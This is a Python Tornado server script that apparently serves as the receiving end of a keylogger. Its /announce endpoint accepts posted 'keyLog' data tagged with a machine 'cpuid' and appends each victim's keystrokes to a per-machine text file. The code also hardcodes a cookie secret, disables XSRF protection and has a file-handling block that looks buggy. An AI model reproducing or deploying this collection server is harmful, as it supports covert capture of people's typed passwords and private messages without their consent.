import os
import tornado.ioloop
import tornado.web
import tornado.escape
import tornado.httpserver
import threading
import queue
import time


class LogWriter():
    def __init__(self):
        self.queue = queue.Queue()
        self.opened_files = []
        self.opened_files_handles = []
        self.mutex = threading.Lock()

    def run(self):
        while True:
            dic = self.queue.get(block=True)  # type: list
            try:
                self.mutex.acquire(blocking=True)  # 加锁 writer和cleaner要互斥读写文件列表
                idx = self.opened_files.index(dic[0])
                f = self.opened_files_handles[idx]
                f.write(dic[1]+'\n')
            except:
                f = open(dic[0]+'.txt', 'a')
                f.write(dic[1]+'\n')
                self.opened_files.append(dic[0])
                self.opened_files_handles.append(f)
            finally:
                self.opened_files_handles[0].close()
                self.opened_files.clear()
                self.opened_files_handles.clear()
                self.mutex.release()  # 解锁

    def cleaner(self):
        while True:
            # 每20s重开文件（flush）
            time.sleep(20)
            self.mutex.acquire(blocking=True)  # 加锁 writer和cleaner要互斥读写文件列表
            for f in self.opened_files_handles:
                f.close()
            self.opened_files_handles.clear()
            self.opened_files.clear()
            self.mutex.release()  # 解锁


class AnnounceHandler(tornado.web.RequestHandler):
    # post: /announce
    async def post(self):
        print(self.get_argument("keyLog"))
        self.write('ACK')
        if self.get_argument("keyLog") != '':
            log_writer.queue.put((self.get_argument("cpuid"), self.get_argument("keyLog")))


def make_app():
    settings = {
        "static_path": os.path.join(os.path.dirname(__file__), "static"),
        "template_path": os.path.join(os.path.dirname(__file__), "templates"),
        "cookie_secret": "`10uu00as8j[].;.[;[,p8",
        "xsrf_cookies": False,
        "debug": True,
        "compiled_template_cache": False,
    }
    return tornado.web.Application([
        (tornado.web.HostMatches(r'.*'), [
            (r"/announce", AnnounceHandler),
        ])
    ], **settings)


if __name__ == "__main__":
    # 开LogWriter
    log_writer = LogWriter()
    t1 = threading.Thread(target=log_writer.run)
    t2 = threading.Thread(target=log_writer.cleaner)
    t1.setDaemon(True)
    t2.setDaemon(True)
    t1.start()
    t2.start()

    # 开HTTP服务器
    app = make_app()
    server = tornado.httpserver.HTTPServer(app)
    server.bind(8086)
    server.start(1)  # 0: forks one process per cpu
    tornado.ioloop.IOLoop.current().start()
